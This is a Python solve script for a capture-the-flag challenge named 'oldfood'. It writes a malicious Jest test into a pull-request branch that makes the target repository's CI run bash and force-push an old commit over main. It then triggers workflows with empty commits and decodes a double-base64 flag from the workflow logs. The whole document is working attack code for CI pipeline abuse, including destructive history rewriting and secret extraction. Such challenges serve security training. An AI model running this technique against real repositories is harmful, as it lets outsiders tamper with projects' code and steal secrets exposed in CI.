#!/usr/bin/env python3
import base64
import json
import os
import re
import subprocess
import sys
import time
from pathlib import Path


ROOT = Path("/home/kali/ctf/GPNCTF2026/misc/oldfood")
FORK = ROOT / "forkrepo"
TARGET_REPO = "GPNCTF24-2/250845531_rhnataiet23-art_old-food-challenge"
PR_NUMBER = 3
PR_BRANCH = "xrepo-pwn"

PAYLOAD = """test("rewind target main to old flag workflow commit", () => {
  require("child_process").execFileSync(
    "bash",
    [
      "-lc",
      `
set -euo pipefail
git fetch --depth=10 origin feature/pr-checks:feature-src
git push -f origin feature-src~2:refs/heads/flagold
git push -f origin feature-src~2:refs/heads/main
      `,
    ],
    { stdio: "inherit" },
  );
});
"""


def run(cmd, cwd=None, check=True):
  proc = subprocess.run(
    cmd,
    cwd=cwd,
    text=True,
    capture_output=True,
  )
  if check and proc.returncode != 0:
    sys.stderr.write(proc.stdout)
    sys.stderr.write(proc.stderr)
    raise SystemExit(proc.returncode)
  return proc


def git(args, cwd=FORK, check=True):
  return run(["git", *args], cwd=cwd, check=check)


def gh(args, cwd=ROOT, check=True):
  return run(["gh", *args], cwd=cwd, check=check)


def wait_for_new_run(workflow_name, previous_ids, timeout=180):
  deadline = time.time() + timeout
  while time.time() < deadline:
    proc = gh(
      ["run", "list", "-R", TARGET_REPO, "--limit", "20", "--json", "databaseId,workflowName,status,conclusion,headBranch,event"],
      check=True,
    )
    runs = json.loads(proc.stdout)
    for item in runs:
      if item["workflowName"] != workflow_name:
        continue
      if item["databaseId"] in previous_ids:
        continue
      return item["databaseId"]
    time.sleep(3)
  raise SystemExit(f"timeout waiting for workflow {workflow_name}")


def wait_for_completion(run_id, timeout=240):
  deadline = time.time() + timeout
  while time.time() < deadline:
    proc = gh(["run", "view", str(run_id), "-R", TARGET_REPO, "--json", "status,conclusion"], check=True)
    data = json.loads(proc.stdout)
    if data["status"] == "completed":
      return data["conclusion"]
    time.sleep(3)
  raise SystemExit(f"timeout waiting for run {run_id}")


def get_run_ids():
  proc = gh(["run", "list", "-R", TARGET_REPO, "--limit", "20", "--json", "databaseId,workflowName"], check=True)
  return {item["databaseId"] for item in json.loads(proc.stdout)}


def extract_flag_from_log(run_id):
  proc = gh(["run", "view", str(run_id), "-R", TARGET_REPO, "--log"], check=True)
  joined = ""
  for line in proc.stdout.splitlines():
    if "\t" not in line:
      continue
    text = line.split("\t", 2)[-1].strip()
    if re.fullmatch(r"[A-Za-z0-9+/=]{20,}", text):
      joined += text
  if not joined:
    raise SystemExit("encoded flag not found in logs")
  return base64.b64decode(base64.b64decode(joined)).decode().strip()


def main():
  if not FORK.exists():
    raise SystemExit(f"missing fork repo at {FORK}")

  test_file = FORK / "tests" / "pwn.test.js"
  test_file.write_text(PAYLOAD)

  git(["add", "tests/pwn.test.js"])
  git(["commit", "-m", "solve: rewind main to flag commit"], check=False)
  git(["push", "origin", PR_BRANCH])

  before = get_run_ids()
  git(["commit", "--allow-empty", "-m", "solve: trigger rewind run"])
  git(["push", "origin", PR_BRANCH])

  ci_run = wait_for_new_run("CI", before)
  conclusion = wait_for_completion(ci_run)
  if conclusion != "success":
    raise SystemExit(f"CI run {ci_run} ended with {conclusion}")

  before = get_run_ids()
  git(["commit", "--allow-empty", "-m", "solve: trigger flag workflow"])
  git(["push", "origin", PR_BRANCH])

  flag_run = wait_for_new_run(".github/workflows/flag.yml", before)
  conclusion = wait_for_completion(flag_run)
  if conclusion != "success":
    raise SystemExit(f"flag run {flag_run} ended with {conclusion}")

  flag = extract_flag_from_log(flag_run)
  print(flag)


if __name__ == "__main__":
  main()
